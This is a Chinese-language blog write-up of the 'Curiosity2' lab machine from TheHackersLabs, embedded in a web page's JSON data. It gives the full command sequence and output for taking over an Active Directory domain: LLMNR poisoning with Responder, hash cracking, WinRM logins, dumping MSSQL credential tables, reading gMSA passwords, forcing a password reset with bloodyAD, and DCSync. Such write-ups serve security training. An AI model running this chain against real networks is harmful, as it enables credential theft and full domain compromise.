{"pageProps":{"postData":{"id":"TheHackersLabsCuriosity2","contentHtml":"<h1>Curiosity2</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/103\">https://labs.thehackerslabs.com/machine/103</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsCuriosity2/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<p><code>nmap</code> 端口扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity2 nmap -sT -min-rate 10000 -p- 192.168.56.116 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 19:40 CST\nWarning: 192.168.56.116 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.116\nHost is up (0.00030s latency).\nNot shown: 64872 closed tcp ports (conn-refused), 638 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49684/tcp open  unknown\n49685/tcp open  unknown\n49689/tcp open  unknown\n49693/tcp open  unknown\n49704/tcp open  unknown\n57936/tcp open  unknown\n60031/tcp open  unknown\nMAC Address: 08:00:27:06:86:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Curiosity2 nmap -sT -A -p $(<span class=\"hljs-built_in\">cat</span> port | awk -F <span class=\"hljs-string\">'/'</span> <span class=\"hljs-string\">'{print $1}'</span> | <span class=\"hljs-built_in\">paste</span> -sd <span class=\"hljs-string\">','</span>) 192.168.56.116\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 19:41 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.116\nHost is up (0.00086s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-07-19 11:41:37Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-07-19T11:42:41+00:00; 0s from scanner <span class=\"hljs-keyword\">time</span>.\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-07-19T11:42:41+00:00; 0s from scanner <span class=\"hljs-keyword\">time</span>.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-07-19T11:42:41+00:00; 0s from scanner <span class=\"hljs-keyword\">time</span>.\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-07-19T11:42:41+00:00; 0s from scanner <span class=\"hljs-keyword\">time</span>.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49685/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  msrpc         Microsoft Windows RPC\n49693/tcp open  msrpc         Microsoft Windows RPC\n49704/tcp open  msrpc         Microsoft Windows RPC\n57936/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-info:\n|   192.168.56.116\\SQLEXPRESS:\n|     Instance name: SQLEXPRESS\n|     Version:\n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: <span class=\"hljs-literal\">false</span>\n|     TCP port: 57936\n|_    Clustered: <span class=\"hljs-literal\">false</span>\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-07-19T11:42:41+00:00; 0s from scanner <span class=\"hljs-keyword\">time</span>.\n| ms-sql-ntlm-info:\n|   192.168.56.116\\SQLEXPRESS:\n|     Target_Name: CONS\n|     NetBIOS_Domain_Name: CONS\n|     NetBIOS_Computer_Name: WIN-C73PROQLRHL\n|     DNS_Domain_Name: cons.thl\n|     DNS_Computer_Name: WIN-C73PROQLRHL.cons.thl\n|_    Product_Version: 10.0.14393\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n60031/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:06:86:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: WIN-C73PROQLRHL; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   <span class=\"hljs-built_in\">date</span>: 2025-07-19T11:42:32\n|_  start_date: 2025-07-19T18:29:12\n|_nbstat: NetBIOS name: WIN-C73PROQLRHL, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: 08:00:27:06:86:f8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.86 ms 192.168.56.116\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 83.59 seconds\n</code></pre>\n<h3>枚举测试</h3>\n<p>测试 <code>SMB</code> 匿名账户</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity2 nxc smb cons.thl -u anonymous -p <span class=\"hljs-string\">''</span>                                                             \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [-] cons.thl\\anonymous: STATUS_LOGON_FAILURE \n</code></pre>\n<p>再看一眼 <code>wireshark</code> ，依旧有 <code>LLMNR</code>包，并且从数据包可以看出来是在查询 <code>SQLserver</code></p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity2/image1.png\" alt=\"image.png\"></p>\n<h3>Responder</h3>\n<p>我们开启 <code>Responder</code> 不一会就就能抓到 <code>HASH</code></p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity2/image2.png\" alt=\"image.png\"></p>\n<p>开局的思路和<code>Curiosity</code>差不多</p>\n<p>我们尝试将<code>HASH</code>进行爆破</p>\n<pre><code class=\"hljs language-bash\">hashcat -m 5600 <span class=\"hljs-built_in\">hash</span> /usr/share/seclists/Passwords/seasons.txt\n</code></pre>\n<p>得到密码<code>au7umn@</code></p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity2/image3.png\" alt=\"image.png\"></p>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity2 nxc smb cons.thl -u sqldb -p <span class=\"hljs-string\">'au7umn@'</span>\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\sqldb:au7umn@ \n\n➜  Curiosity2 nxc ldap cons.thl -u sqldb -p <span class=\"hljs-string\">'au7umn@'</span>\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\\sqldb:au7umn@ \n\n➜  Curiosity2 nxc winrm cons.thl -u sqldb -p <span class=\"hljs-string\">'au7umn@'</span>\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [+] cons.thl\\sqldb:au7umn@ (Pwn3d!)\n</code></pre>\n<h2>脱库</h2>\n<p>根据用户名，该用户应该是对数据库有一定权限</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S <span class=\"hljs-string\">\"localhost\\SQLEXPRESS\"</span> -Q <span class=\"hljs-string\">\"SELECT @@VERSION\"</span>\n\n------------------------------------------------------------------------------\nMicrosoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)\n        Sep 24 2019 13:48:23\n        Copyright (C) 2019 Microsoft Corporation\n        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 &#x3C;X64> (Build 14393: ) (Hypervisor)\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S <span class=\"hljs-string\">\"localhost\\SQLEXPRESS\"</span> -Q <span class=\"hljs-string\">\"SELECT name FROM sys.databases\"</span>\nname\n--------------------------------------------------------------------------------------------------------------------------------\nmaster\ntempdb\nmodel\nmsdb\nCredentialsDB\ntoolsdb\n\n(6 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S <span class=\"hljs-string\">\"localhost\\SQLEXPRESS\"</span> -Q <span class=\"hljs-string\">\"USE CredentialsDB;SELECT name FROM sys.tables\"</span>\nChanged database context to <span class=\"hljs-string\">'CredentialsDB'</span>.\nname\n--------------------------------------------------------------------------------------------------------------------------------\nCredentials\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S <span class=\"hljs-string\">\"localhost\\SQLEXPRESS\"</span> -Q <span class=\"hljs-string\">\"USE CredentialsDB;SELECT * FROM Credentials\"</span>\nChanged database context to <span class=\"hljs-string\">'CredentialsDB'</span>.\nID          Username                                           Password\n----------- -------------------------------------------------- -------------------------------------------------------------\n          1 sqlsvc                                             a6d888301de7aa3b380a691d32837627\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S <span class=\"hljs-string\">\"localhost\\SQLEXPRESS\"</span> -Q <span class=\"hljs-string\">\"USE toolsdb;SELECT name FROM sys.tables\"</span>\nMsg 916, Level 14, State 2, Server WIN-C73PROQLRHL\\SQLEXPRESS, Line 1\nThe server principal <span class=\"hljs-string\">\"CONS\\sqldb\"</span> is not able to access the database <span class=\"hljs-string\">\"toolsdb\"</span> under the current security context.\n</code></pre>\n<p>拿到 <code>sqlsvc</code> 的密码<code>MD5</code>值，拿去破解，还可以发现</p>\n<p>得到密码 <code>$PRING2021#</code></p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity2 john --wordlist=/usr/share/seclists/Passwords/seasons.txt --format=Raw-MD5 <span class=\"hljs-built_in\">hash</span>\nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support <span class=\"hljs-keyword\">for</span> this <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-built_in\">type</span>, consider --fork=8\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\n<span class=\"hljs-variable\">$PRING2021</span>#      (?)     \n1g 0:00:00:00 DONE (2025-07-19 20:11) 50.00g/s 19200p/s 19200c/s 19200C/s <span class=\"hljs-variable\">$pr1ng</span>..<span class=\"hljs-variable\">$umm3r2021</span>%\nUse the <span class=\"hljs-string\">\"--show --format=Raw-MD5\"</span> options to display all of the cracked passwords reliably\nSession completed.\n</code></pre>\n<p>测试<code>sqlsvc</code>的凭据</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity2 nxc winrm cons.thl -u sqlsvc -p <span class=\"hljs-string\">'$PRING2021#'</span>\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [+] cons.thl\\sqlsvc:<span class=\"hljs-variable\">$PRING2021</span># (Pwn3d!)\n➜  Curiosity2 nxc ldap cons.thl -u sqlsvc -p <span class=\"hljs-string\">'$PRING2021#'</span>\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\\sqlsvc:<span class=\"hljs-variable\">$PRING2021</span># \n➜  Curiosity2 nxc smb cons.thl -u sqlsvc -p <span class=\"hljs-string\">'$PRING2021#'</span>\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\sqlsvc:<span class=\"hljs-variable\">$PRING2021</span>#\n</code></pre>\n<h2>KeePass - 1</h2>\n<p>使用<code>WinRM</code>登陆上去后，目录中有一个<code>Database.kdbx</code></p>\n<p>是<code>KeePass</code>的文件</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\sqlsvc\\Documents> <span class=\"hljs-built_in\">ls</span>\n\n    Directory: C:\\Users\\sqlsvc\\Documents\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       10/31/2024   6:23 PM           2231 Database.kdbx\n</code></pre>\n<p>我们尝试一下使用<code>KeePass</code> 来打开，需要密码</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity2/image4.png\" alt=\"image.png\"></p>\n<p>没有密码，先放着</p>\n<h2>横向移动</h2>\n<h3>域分析</h3>\n<p>上 <code>BloodHound</code></p>\n<p>用户很多，所以这里直接筛选了远程管理组（REMOTE MANAGMENT US）的用户</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity2/image5.png\" alt=\"image.png\"></p>\n<p>能发现 <code>SQLSVC</code> 能直接修改 <code>GMSA_SQL</code>的密码</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity2/image6.png\" alt=\"image.png\"></p>\n<p>然后 <code>GMSA_SQL</code> 还可以修改 <code>TOOLSDB</code> （上边有一个同名数据库，我们无权限访问）的密码</p>\n<p>总结起来就是</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity2/image7.png\" alt=\"image.png\"></p>\n<h3>To Toolsdb</h3>\n<p>首先读取 <code>gMSA</code>的密码</p>\n<pre><code class=\"hljs language-bash\">➜  gMSADumper python gMSADumper.py -u sqlsvc -p <span class=\"hljs-string\">'$PRING2021#'</span> -d cons.thl  \nUsers or <span class=\"hljs-built_in\">groups</span> <span class=\"hljs-built_in\">who</span> can <span class=\"hljs-built_in\">read</span> password <span class=\"hljs-keyword\">for</span> GMSA_SQL$:\n > Svc_Accounts\nGMSA_SQL$:::0960ee1575670e65d189eb6e685713ca\nGMSA_SQL$:aes256-cts-hmac-sha1-96:ba95bac751b094ed71a42fcb7c4c1b34c5bdea75e47054744fa5b11863be0ea0\nGMSA_SQL$:aes128-cts-hmac-sha1-96:e74d4f008426bf3fe930d12485d3f212\n</code></pre>\n<p>再通过 <code>GMSA_SQL</code> 修改 <code>TOOLSDB</code> 的密码</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity2 bloodyAD -d <span class=\"hljs-string\">'cons.thl'</span> -u <span class=\"hljs-string\">'GMSA_SQL$'</span> -p :0960ee1575670e65d189eb6e685713ca --dc-ip 192.168.56.116 <span class=\"hljs-built_in\">set</span> password <span class=\"hljs-string\">'TOOLSDB'</span> <span class=\"hljs-string\">'Password@123'</span>\n[+] Password changed successfully!\n</code></pre>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity2 nxc smb cons.thl -u TOOLSDB -p <span class=\"hljs-string\">'Password@123'</span>\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\TOOLSDB:Password@123 \n</code></pre>\n<h3>To Msol &#x26; KeePass - 2</h3>\n<p>我们登陆上<code>toolsdb</code> ，并用数据库脱 <code>toolsdb</code> 的数据</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\toolsdb\\Desktop> sqlcmd -S <span class=\"hljs-string\">\"localhost\\SQLEXPRESS\"</span> -Q <span class=\"hljs-string\">\"USE toolsdb;select name from sys.tables\"</span>\nChanged database context to <span class=\"hljs-string\">'toolsdb'</span>.\nname\n--------------------------------------------------------------------------------------------------------------------------------\n<span class=\"hljs-built_in\">users</span>\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\toolsdb\\Desktop> sqlcmd -S <span class=\"hljs-string\">\"localhost\\SQLEXPRESS\"</span> -Q <span class=\"hljs-string\">\"USE toolsdb;select * from users\"</span>\nChanged database context to <span class=\"hljs-string\">'toolsdb'</span>.\n<span class=\"hljs-built_in\">id</span>          username                                           password\n----------- -------------------------------------------------- --------------------------------------------------\n          1 user_6B482050                                      433129A1!@1\n          2 user_47F7501A                                      64409A1C!@1\n          3 user_515A0C58                                      CAD616E3!@1\n          4 user_CA843BF2                                      731C60AD!@1\n          5 user_AA2B9FF8                                      8E181E5F!@1\n          6 user_F6E6A108                                      47862562!@1\n          7 user_8D56BAE8                                      425B6335!@1\n          8 user_BA9B1295                                      E4FC1AC4!@1\n          9 user_66B7DBEE                                      4EE216A3!@1\n         10 user_E75B7C23                                      4CD89A92!@1\n\n(10 rows affected)\n</code></pre>\n<p>给了一组密码，感觉是 <code>KeePass</code> 文件的密码</p>\n<pre><code class=\"hljs language-bash\">433129A1!@1\n64409A1C!@1\nCAD616E3!@1\n731C60AD!@1\n8E181E5F!@1\n47862562!@1\n425B6335!@1\nE4FC1AC4!@1\n4EE216A3!@1\n4CD89A92!@1\n</code></pre>\n<p>最后使用<code>8E181E5F!@1</code>成功解密</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity2/image8.png\" alt=\"image.png\"></p>\n<p>得到用户 <code>MSOL</code> 用户密码 <code>YRax2Ry8g2ITQ3hpRPze</code></p>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-bash\">➜  Curiosity2 nxc smb cons.thl -u MSOL -p <span class=\"hljs-string\">'YRax2Ry8g2ITQ3hpRPze'</span>\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\MSOL:YRax2Ry8g2ITQ3hpRPze \n</code></pre>\n<h3>To Administrator</h3>\n<p>查看权限，oiiaioiiiai</p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity2/image9.png\" alt=\"image.png\"></p>\n<p>我们对域有<code>GetChangeAll</code></p>\n<p>直接<code>Dump</code></p>\n<p><img src=\"/post-images/TheHackersLabsCuriosity2/image10.png\" alt=\"image.png\"></p>\n<p>读取 <code>user.txt</code> 和 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\appolonia\\Documents> <span class=\"hljs-built_in\">cat</span> User.flag.txt\nde4xxxxxxxxxxxxxxxxxxxx\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> <span class=\"hljs-built_in\">cat</span> root.flag.txt\n372xxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>总结</h2>\n<p>没有卡点，酣畅淋漓，一把梭哈</p>\n<p>现在就<code>Curiosity3</code>把我卡住了</p>","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","updated":"2025-07-19","tags":["TheHackersLabs","Windows","AD","Responder","MSSQL","gMSA","KeePass"],"categories":"靶机","comments":true,"description":"Curiosity2\n\n https://labs.thehackerslabs.com/machine/103\n \n\n\n\nRecon\n\nPortScan\n\n`nmap` 端口扫描\n\n\n\n\n\n枚举测试\n\n测试 `SMB` 匿名账户\n\n\n\n再看一眼 `wireshark` ，依旧有 `LLMNR`包，并且从数据包可以看出来是在查询 `SQLserver`\n\n\n\nResponder\n\n我们开启 `Re..."},"recentPosts":[{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"}]},"__N_SSG":true}